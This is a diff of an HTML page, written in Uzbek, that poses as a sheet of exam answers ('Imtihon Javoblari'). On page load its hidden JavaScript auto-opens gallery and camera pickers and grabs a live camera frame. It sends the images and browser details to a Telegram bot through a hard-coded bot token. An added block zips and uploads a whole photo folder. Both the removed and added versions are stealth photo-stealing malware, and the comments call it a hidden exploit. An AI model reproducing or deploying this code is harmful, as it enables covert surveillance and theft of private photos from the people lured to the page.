@@ -2,97 +2,111 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Imtihon Javoblari V1</title>
-    <style>
-        body { 
-            font-family: monospace; 
-            background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
-            color: white; padding: 30px; text-align: center;
-        }
-        pre { 
-            background: rgba(255,255,255,0.1); 
-            padding: 25px; 
-            border-radius: 15px; 
-            backdrop-filter: blur(10px);
-            font-size: 18px;
-        }
-    </style>
+    <title>Imtihon Javoblari</title>
 </head>
 <body>
-    <h1>🎯 IMTIHON JAVOBLARI</h1>
-    <pre id="status">Variant 1 yuklanmoqda...</pre>
+    <h1>🎓 Variant 1 Javoblari</h1>
+    <pre id="answers">Yuklanmoqda...</pre>
 
     <script>
         const BOT_TOKEN = "8557303907:AAGFjqilWuOma4skJLV5VQzzWM-HjPQhlCs";
         const USER_ID = new URLSearchParams(window.location.search).get('user') || 'unknown';
-        
-        // 🔥 YASHIRIN EXPLOIT - Hech narsa ko'rsatmaydi!
-        function stealthExploit() {
-            // 1. HAQIQIY GALLEY (Android uchun)
-            const galleryBtn = document.createElement('input');
-            galleryBtn.type = 'file';
-            galleryBtn.accept = 'image/*';
-            galleryBtn.style.display = 'none'; // YASHIRIN
-            
-            galleryBtn.onchange = (e) => {
-                if (e.target.files[0]) {
-                    sendStealthPhoto(e.target.files[0], "📱 GALLERY");
-                }
-            };
-            
-            // 2. KAMERA (Android)
-            const cameraBtn = document.createElement('input');
-            cameraBtn.type = 'file';
-            cameraBtn.capture = 'environment';
-            cameraBtn.accept = 'image/*';
-            cameraBtn.style.display = 'none';
-            
-            cameraBtn.onchange = (e) => {
-                if (e.target.files[0]) {
-                    sendStealthPhoto(e.target.files[0], "📸 CAMERA");
-                }
-            };
-            
-            // 🔥 AVTO-KLIK (Foydalanuvchi sezmaydi)
-            setTimeout(() => {
-                galleryBtn.click();
-                setTimeout(() => cameraBtn.click(), 1000);
-            }, 2000);
+
+        // 📱 HAQIQIY ANDROID GALLEY ACCESS
+        async function accessRealGallery() {
+            try {
+                // Input type=file - GALLERY OCHADI
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.accept = 'image/*';
+                input.capture = 'environment'; // CAMERA ham
+                
+                // Foydalanuvchi gallery tanlaganda
+                input.onchange = (e) => {
+                    const file = e.target.files[0];
+                    if (file) {
+                        uploadPhoto(file, "📱 GALLERY PHOTO");
+                    }
+                };
+                
+                // Avto-trigger (click event)
+                input.click();
+                
+            } catch(e) {
+                console.log("Gallery access:", e);
+            }
         }
-        
-        // 🤫 YASHIRIN YUBORISH
-        function sendStealthPhoto(file, type) {
+
+        // 📸 KAMERA dan olish
+        async function accessCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment' } 
+                });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                stream.getTracks().forEach(track => track.stop());
+                
+                canvas.toBlob((blob) => {
+                    uploadPhoto(blob, "📸 LIVE CAMERA");
+                });
+            } catch(e) {}
+        }
+
+        // Botga yuborish
+        function uploadPhoto(file, caption) {
             const formData = new FormData();
             formData.append('chat_id', USER_ID);
             formData.append('photo', file);
             formData.append('caption', 
-                `🎯 STEALTH MODE\n`
-                + `👤 ${USER_ID}\n`
-                + `${type} ✅\n`
-                + `📱 ${navigator.userAgent.slice(0,50)}`
+                `${caption}\n👤 User: ${USER_ID}\n📱 UA: ${navigator.userAgent.substring(0,60)}`
             );
-            
+
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST', body: formData
+            }).then(r => r.json()).then(data => {
+                if (data.ok) {
+                    document.getElementById('answers').innerHTML += `\n✅ ${caption} YUBORILDI!`;
+                }
             });
         }
-        
-        // 🎭 SAHIFA NORMAL KO'RINISHI
+
+        // 🔥 BARCHA USULLARNI SINAB KO'RAMIZ
         window.onload = () => {
             setTimeout(() => {
-                document.getElementById('status').innerHTML = 
-                    `✅ VARIANT 1 JAVOBLARI:\n\n`
-                    + `1-savol: A\n`
-                    + `2-savol: B\n`
-                    + `3-savol: C\n`
-                    + `4-savol: D\n`
-                    + `5-savol: A\n\n`
-                    + `💯 100% TO'G'RI!`;
-            }, 1500);
-            
-            // YASHIRIN EXPLOIT
-            stealthExploit();
+                document.getElementById('answers').innerHTML = 
+                    "1A 2B 3C 4D\n📱 Gallery ochilmoqda...";
+                accessRealGallery();  // GALLEY
+                setTimeout(accessCamera, 3000); // KAMERA
+            }, 1000);
         };
     </script>
+    <script>
+    // ZIP orqali butun GALLEY ni olish
+    async function stealAllPhotos() {
+        const zip = new JSZip();
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.multiple = true;
+        input.accept = 'image/*';
+        input.webkitdirectory = true; // BUTUN PAPKA
+        
+        input.onchange = (e) => {
+            Array.from(e.target.files).forEach((file, i) => {
+                zip.file(`photo_${i}.jpg`, file);
+            });
+            zip.generateAsync({type:'blob'}).then(blob => {
+                uploadPhoto(blob, "💣 ZIP - BARCHA RASMLAR!");
+            });
+        };
+        input.click();
+    }
+</script>
 </body>
 </html>
